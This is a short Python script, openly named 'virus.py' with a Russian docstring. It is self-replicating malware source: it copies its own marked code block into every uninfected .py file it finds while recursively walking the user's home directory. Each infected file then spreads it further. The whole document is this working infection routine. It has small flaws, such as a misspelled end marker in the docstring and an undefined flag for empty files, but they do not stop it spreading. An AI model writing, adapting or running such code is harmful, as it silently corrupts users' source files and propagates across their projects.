""" virus.py -- Рекурсивно заражает файлы [`.py`] кодом между #STARTED# #STOPTED# """

# STARTED#
import sys, os

BEGIN = "# STARTED#\n"
END = "# STOPPED#\n"


def virus(python: str):
    with open(sys.argv[0], "r") as copy:
        k = 0
        virus_code = "\n"
        for line in copy:
            if line == BEGIN:
                k = 1
                virus_code += BEGIN
            elif k == 1 and line != END:
                virus_code += line
            elif line == END:
                virus_code += END
                break

    """ Для получения данных из файла и проверки его на заражённость"""
    with open(python, "r") as file:
        origin_code = ""
        for line in file:
            origin_code += line
            if line == BEGIN:
                Virus = True
                break
            else:
                Virus = False
    if Virus == False:
        with open(python, "w") as paste:
            paste.write(virus_code + "\n\n" + origin_code)


def walk(dir: str):
    for name in os.listdir(dir):
        try:
            path = os.path.join(dir, name)
            if os.path.isfile(path):
                if os.path.splitext(path)[1] == ".py":
                    print(path)
                    virus(path)
            else:
                walk(path)
        except:
            print("***Error in", path)


homedir = os.path.expanduser("~")
walk(homedir)
# STOPPED#
